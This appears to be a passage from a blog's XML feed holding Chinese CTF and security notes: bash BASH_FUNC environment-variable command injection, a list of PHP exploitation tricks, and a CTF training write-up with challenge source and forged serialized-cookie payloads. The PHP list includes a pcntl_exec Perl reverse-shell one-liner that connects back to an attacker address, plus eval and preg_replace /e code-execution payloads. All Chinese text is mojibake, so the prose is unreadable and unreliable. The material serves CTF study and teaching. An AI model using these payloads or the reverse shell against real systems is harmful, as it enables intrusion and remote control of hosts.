<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">privmode == <span class="hljs-number">0</span>ï¼Œå³ä¸èƒ½ä¼ å…¥-på‚æ•°<br>read_but_dont_execute == <span class="hljs-number">0</span>ï¼Œå³ä¸èƒ½ä¼ å…¥-nå‚æ•°<br>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)ï¼Œç¯å¢ƒå˜é‡åå‰<span class="hljs-number">10</span>ä¸ªå­—ç¬¦ç­‰äºBASH_FUNC_<br>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)ï¼Œç¯å¢ƒå˜é‡ååä¸¤ä¸ªå­—ç¬¦ç­‰äº%%<br>STREQN (<span class="hljs-string">&quot;() &#123;&quot;</span>, <span class="hljs-built_in">string</span>, <span class="hljs-number">4</span>)ï¼Œç¯å¢ƒå˜é‡çš„å€¼å‰<span class="hljs-number">4</span>ä¸ªå­—ç¬¦ç­‰äº() &#123;<br></code></pre></td></tr></table></figure>

<p>å…¶å®å°±æ˜¯æ ¹æ®ç¯å¢ƒå˜é‡çš„å€¼åˆå§‹åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶èµ‹äºˆå…¶åå­—</p>
<p>ä¾‹å¦‚<code>env $&#39;BASH_FUNC_myfunc%%=() &#123; id; &#125;&#39; bash -c &#39;myfunc&#39;</code></p>
<p>å†å°†å˜é‡åæ”¹æˆsystemä¸­æ‰§è¡Œçš„å‡½æ•°åï¼Œå°±èƒ½å®ç°è¦†ç›–</p>
<p><code>env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code></p>
<p><img src="/img/linux/linux-sh-6.png"></p>
<hr>
<p>ä½†æ˜¯è®¾ç½®<code>BASH_FUNC_myfunc%%</code>çš„æ–¹æ³•å¹¶ä¸å®Œç¾ï¼Œå› ä¸º<code>BASH_FUNC_</code>æ˜¯åœ¨Bash 4.4ä¸‹å¼•å…¥çš„ï¼Œcentos 7çš„bashç‰ˆæœ¬é»˜è®¤ä¸ºBash 4.2</p>
<p><a href="https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826">Bash 4.2çš„è¡¥ä¸</a></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨4.2ä¸‹çš„BASHFUNC_SUFFIXæ˜¯<code>()</code>ï¼Œè€Œä¸æ˜¯<code>%%</code></p>
<p><img src="/img/linux/linux-sh-7.png"></p>
<p>æ›´æ”¹payloadï¼š<code>env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &quot;echo hello&quot;</code></p>
<p>è§£å†³äº†æ–‡ç« å¼€å¤´æå‡ºçš„é—®é¢˜</p>
<p><img src="/img/linux/linux-sh-8.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><table>
<thead>
<tr>
<th></th>
<th>dash</th>
<th>bash</th>
<th>æ¡ä»¶</th>
</tr>
</thead>
<tbody><tr>
<td>ENV</td>
<td>âˆš</td>
<td>âˆš</td>
<td>shæˆ–è€…dashä¸‹é¢å¤–çš„ -i -c å‚æ•°</td>
</tr>
<tr>
<td>PS1</td>
<td>âˆš</td>
<td>âˆš</td>
<td>äº¤äº’ç¯å¢ƒä¸‹</td>
</tr>
<tr>
<td>BASH_ENV</td>
<td>Ã—</td>
<td>âˆš</td>
<td>å¯ä»¥åœ¨ bash -c æ—¶æ³¨å…¥ä»»æ„å‘½ä»¤ sh -c ä¸‹æ— æ•ˆ</td>
</tr>
<tr>
<td>PROMPT_COMMAND</td>
<td>Ã—</td>
<td>âˆš</td>
<td>äº¤äº’ç¯å¢ƒä¸‹</td>
</tr>
<tr>
<td>BASH_FUNC_xxx%%</td>
<td>âˆš</td>
<td>4.4åŠä»¥ä¸Š âˆš</td>
<td>æ— </td>
</tr>
<tr>
<td>BASH_FUNC_xxx()</td>
<td>âˆš</td>
<td>4.4ä»¥å‰ âˆš</td>
<td>æ— </td>
</tr>
<tr>
<td>shellshock</td>
<td>âˆš</td>
<td>âˆš</td>
<td>å­˜åœ¨shellshockæ¼æ´</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bash</tag>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>php_trick</title>
    <url>/posts/1ac6587f/</url>
    <content><![CDATA[<p>è®°å½•phpä¸‹çš„å°æŠ€å·§å’Œç‰¹æ€§</p>
<h1 id="å‘½ä»¤æ‰§è¡Œä¸­æ–­æŠ¥é”™"><a href="#å‘½ä»¤æ‰§è¡Œä¸­æ–­æŠ¥é”™" class="headerlink" title="å‘½ä»¤æ‰§è¡Œä¸­æ–­æŠ¥é”™"></a>å‘½ä»¤æ‰§è¡Œä¸­æ–­æŠ¥é”™</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&#x27;aaa&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨<code>__halt_compiler();</code>ä¸­æ–­ç¼–è¯‘å™¨çš„æ‰§è¡Œï¼Œä¸è®©evalæŠ¥é”™</p>
<p><code>$cmd=&#39;system(&quot;whoami&quot;);__halt_compiler();&#39;;</code></p>
<h1 id="preg-replace-x2F-e-æ¨¡å¼"><a href="#preg-replace-x2F-e-æ¨¡å¼" class="headerlink" title="preg_replace &#x2F;e æ¨¡å¼"></a>preg_replace &#x2F;e æ¨¡å¼</h1><p>ä¸€éƒ¨åˆ†ä¿®æ­£ç¬¦çš„å«ä¹‰</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">1ã€/g è¡¨ç¤ºè¯¥è¡¨è¾¾å¼å°†ç”¨æ¥åœ¨è¾“å…¥å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ‰€æœ‰å¯èƒ½çš„åŒ¹é…ï¼Œè¿”å›çš„ç»“æœå¯ä»¥æ˜¯å¤šä¸ªã€‚å¦‚æœä¸åŠ /gæœ€å¤šåªä¼šåŒ¹é…ä¸€ä¸ª<br>2ã€/i è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™ä¸ªè·Ÿå…¶å®ƒè¯­è¨€çš„æ­£åˆ™ç”¨æ³•ç›¸åŒ<br>3ã€/m è¡¨ç¤ºå¤šè¡ŒåŒ¹é…ã€‚ä»€ä¹ˆæ˜¯å¤šè¡ŒåŒ¹é…å‘¢ï¼Ÿå°±æ˜¯åŒ¹é…æ¢è¡Œç¬¦ä¸¤ç«¯çš„æ½œåœ¨åŒ¹é…ã€‚å½±å“æ­£åˆ™ä¸­çš„^$ç¬¦å·<br>4ã€/s ä¸/mç›¸å¯¹ï¼Œå•è¡Œæ¨¡å¼åŒ¹é…ã€‚<br>5ã€/e å¯æ‰§è¡Œæ¨¡å¼ï¼Œæ­¤ä¸ºPHPä¸“æœ‰å‚æ•°ï¼Œä¾‹å¦‚preg_replaceå‡½æ•°ã€‚<br>6ã€/x å¿½ç•¥ç©ºç™½æ¨¡å¼ã€‚<br></code></pre></td></tr></table></figure>


<p>preg_replace ä½¿ç”¨äº† &#x2F;e æ¨¡å¼ï¼Œå¯¼è‡´äº†ä»£ç å¯ä»¥è¢«æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/aa/e&quot;</span>,<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šphp5.5ä»¥ä¸Šç‰ˆæœ¬&#x2F;eè¢«å¼ƒç”¨</p>
<h1 id="Error-getMessage"><a href="#Error-getMessage" class="headerlink" title="Error::getMessage"></a>Error::getMessage</h1><p>PHPçš„å†…ç½®ç±» Error::getMessageæ–¹æ³•å¯ä»¥è¿”å›Errorç±»å®ä¾‹åŒ–æ—¶æ¥å—çš„å­—ç¬¦ä¸²</p>
<p><code>new Error(&quot;system&quot;)-&gt;getMessage</code>å°±ä¼šè¿”å›<code>system</code></p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br>((<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;system&#x27;</span>))-&gt;<span class="hljs-title function_ invoke__">getMessage</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$Error</span>(<span class="hljs-string">&#x27;ls&#x27;</span>))-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br></code></pre></td></tr></table></figure>


<h1 id="pcntl-execåå¼¹shell"><a href="#pcntl-execåå¼¹shell" class="headerlink" title="pcntl_execåå¼¹shell"></a>pcntl_execåå¼¹shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">pcntl_exec</span>(<span class="hljs-string">&#x27;/usr/bin/perl&#x27;</span>,[<span class="hljs-string">&#x27;-e&#x27;</span>,<span class="hljs-string">&#x27;use Socket;$i=&quot;ip&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<h1 id="phpåŒ¿åç±»"><a href="#phpåŒ¿åç±»" class="headerlink" title="phpåŒ¿åç±»"></a>phpåŒ¿åç±»</h1><p><code>class@anonymous</code>+<code>chr(0)</code>+<code>phpæ–‡ä»¶è·¯å¾„</code>+<code>:</code>+<code>è¡Œæ•°$åˆ—æ•°</code></p>
<p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ezphpPhp8&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ezphpPhp8&#x27;</span>];<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<br><span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//2024çº¢æ˜è°·</span><br></code></pre></td></tr></table></figure>


<p>ç›´æ¥æ„é€ <code>class@anonymous%00/var/www/html/flag.php:7$0</code>å³å¯</p>
<p>æˆ–è€…ç›´æ¥<code>echo urlencode(get_class($a));</code>è¾“å‡º</p>
<h1 id="REQUESTçš„ä¼˜å…ˆçº§"><a href="#REQUESTçš„ä¼˜å…ˆçº§" class="headerlink" title="REQUESTçš„ä¼˜å…ˆçº§"></a>REQUESTçš„ä¼˜å…ˆçº§</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;waf&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_REQUEST</span>);<br></code></pre></td></tr></table></figure>

<p>ä¼šåŒæ—¶æ¥æ”¶postå’Œgetï¼Œä½†ä¼˜å…ˆæ¥æ”¶postçš„å‚æ•°</p>
<p>æ‰€ä»¥postå‘é€åŒåå‚æ•°ågetå¯ä»¥ç»•è¿‡</p>
<h1 id="ä¸€äº›æ›¿æ¢"><a href="#ä¸€äº›æ›¿æ¢" class="headerlink" title="ä¸€äº›æ›¿æ¢"></a>ä¸€äº›æ›¿æ¢</h1><p>localhostå¯ä»¥ä»£æ›¿&#x2F;è¿›è¡Œç»•è¿‡</p>
<h1 id="phpå‡½æ•°å°è®°"><a href="#phpå‡½æ•°å°è®°" class="headerlink" title="phpå‡½æ•°å°è®°"></a>phpå‡½æ•°å°è®°</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">implode</span>() â€” æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>php</tag>
        <tag>trick</tag>
      </tags>
  </entry>
  <entry>
    <title>å¥‡å®‰ä¿¡CTFåŸºç¡€åŸ¹è®­é¢˜ç›®wp</title>
    <url>/posts/3ba7d05a/</url>
    <content><![CDATA[<p>ç¬¬ä¸€æ¬¡å½“ctfè®²å¸ˆ^_^</p>
<p>7.12-7.19 week1<br>7.19-7.26 week2<br>7.26-8.02 week3</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web-2-hack"><a href="#Web-2-hack" class="headerlink" title="Web-2-hack"></a>Web-2-hack</h2><p>ä½¿ç”¨<code>dirsearch</code>æ‰«æåå°ï¼Œå‘ç°å­˜åœ¨<code>shell.php</code></p>
<p><img src="/img/wp/2022/2022qianxin-1.png"></p>
<p>ä½¿ç”¨burpç­‰å·¥å…·æŠ“åŒ…çˆ†ç ´å¯†ç ï¼Œå¾—åˆ°å¯†ç <code>hack</code></p>
<p><img src="/img/wp/2022/2022qianxin-2.png"></p>
<h2 id="web-3-web82"><a href="#web-3-web82" class="headerlink" title="web-3-web82"></a>web-3-web82</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>]:<span class="hljs-string">&#x27;A_A&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>], <span class="hljs-string">&quot;A_A&quot;</span>) !==<span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,have fun&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$str</span>&lt;<span class="hljs-number">9999999999</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too small&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$str</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too big&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>éœ€è¦æˆ‘ä»¬ä¼ å…¥<code>A_A</code>ï¼Œä½†æ˜¯åˆä¸èƒ½ç­‰äº<code>A_A</code>ï¼Œçœ‹ä¼¼å¾ˆçŸ›ç›¾ï¼Œå®é™…ä¸Šåˆ©ç”¨äº†phpçš„ä¸€ä¸ªå°ç‰¹æ€§</p>
<p>åœ¨phpä¸­ï¼Œå˜é‡åä¸­çš„<code>+</code> <code>%20</code> <code>.</code> <code>ç©ºæ ¼</code> <code>[</code>ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥<code>A.A</code>æˆ–<code>A A</code>æ—¶ï¼Œä¹Ÿä¼šè¢«å½“æˆ<code>A_A</code></p>
<p>ç„¶åå°±æ˜¯ç»•è¿‡æ•°å­—ï¼Œå› ä¸ºåœ¨phpä¸­ä¼šè®¤ä¸ºæ•°ç»„æ¯”æ•°å­—å¤§ï¼Œæ‰€ä»¥ä¼ å…¥<code>?A+A[]=</code>å³å¯</p>
<h2 id="vipzone"><a href="#vipzone" class="headerlink" title="vipzone"></a>vipzone</h2><p>é¦–é¡µæœ‰ä¸ªhintï¼Œ<code>guest:guest è´¦æˆ·å·²ç»å¯ç”¨</code>ï¼Œé‚£å°±ç”¨guestè´¦å·ç™»å½•çœ‹ä¸€ä¸‹</p>
<p>å‘ç°æœ‰ä¸¤ä¸ªcookieæ¯”è¾ƒå¯ç–‘ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªéå¸¸æ˜æ˜¾æ˜¯base64åŠ å¯†åçš„å€¼</p>
<p><img src="/img/wp/2022/2022qianxin-3.png"></p>
<p>base64è§£å¯†åå‘ç°æ˜¯æ˜æ–‡çš„åºåˆ—åŒ–å¯¹è±¡</p>
<p><img src="/img/wp/2022/2022qianxin-4.png"></p>
<p>è€Œç¬¬äºŒä¸ªcookie: <code>check</code>æ°æ°ç”¨è¿™ä¸²base64çš„md5å€¼çš„base64å€¼æ¥æ ¡éªŒ</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡ç„¶ååŠ å¯†å°±å¯ä»¥ç»•è¿‡ç™»å½•äº†</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“adminçš„å¯†ç ï¼Œè¿™é‡Œå¯ä»¥å°è¯•ç”¨å¸ƒå°”å‹ä»£æ›¿å¯†ç ï¼Œå¹¶èµ‹å€¼ä¸º1</p>
<p>ä¿®æ”¹åçš„å€¼ï¼š<code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;b:1;&#125;</code><br>base64åŠ å¯†ï¼š<code>Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=</code><br>md5åŠ å¯†ï¼š<code>6897f0060a84ecb0600e4167d2a748e4</code></p>
<p><img src="/img/wp/2022/2022qianxin-5.png"></p>
<h2 id="web-3-web54"><a href="#web-3-web54" class="headerlink" title="web-3-web54"></a>web-3-web54</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…<code>/^\w+$/</code></p>
<div class="note note-info">
            <p>ä¸¤ä¸ª&#x2F;&#x2F;è¡¨ç¤ºå¼€å§‹å’Œç»“æŸ<br>^è¡¨ç¤ºå¼€å§‹å­—ç¬¦ä¸²<br>$è¡¨ç¤ºç»“æŸå­—ç¬¦ä¸²<br>\wè¡¨ç¤ºåŒ…å«[a-zï¼ŒA-Z, _ , 0-9]<br>+è¡¨ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ª\w</p>
          </div>


<p>ç„¶åæ˜¯ä¸€ä¸ª<code>$$args</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°å°†ä¼šè¢«å½“ä½œä¸€ä¸ªå˜é‡åå¹¶æ‰“å°å®ƒçš„å˜é‡å€¼</p>
<p>ä¼ å…¥phpè¶…å…¨å±€å˜é‡<code>$GLOBALS</code>å³å¯</p>
<p><img src="/img/wp/2022/2022qianxin-6.png"></p>
<h2 id="Web-4-littledropbox"><a href="#Web-4-littledropbox" class="headerlink" title="Web-4-littledropbox"></a>Web-4-littledropbox</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>))) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]), <span class="hljs-string">&#x27;&lt;?&#x27;</span>) !== False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">100</span> || <span class="hljs-variable">$info</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">50</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>&#125;<br><br><span class="hljs-variable">$ready</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;ready&#x27;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ready</span> === <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>] = <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    &#125;<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">225</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> === (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;secretKey&#x27;</span>]) &#123;<br>        <span class="hljs-title function_ invoke__">upload</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


